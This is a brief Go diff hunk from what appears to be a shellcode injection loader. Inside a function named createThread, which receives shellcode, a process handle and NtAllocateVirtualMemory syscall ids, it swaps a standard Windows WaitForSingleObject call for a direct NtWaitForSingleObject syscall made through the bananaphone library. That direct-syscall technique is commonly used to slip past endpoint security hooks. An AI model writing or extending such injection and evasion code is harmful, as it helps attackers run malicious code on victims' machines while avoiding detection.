@@ -132,5 +132,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //lpbytesbuffer
 	)
 	fmt.Println("Created thread at", hhosthread)
-	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
+	bananaphone.Syscall(NtWaitForSingleObject, hhosthread, uintptr(0xffffffff), 0)
+	//windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
 }
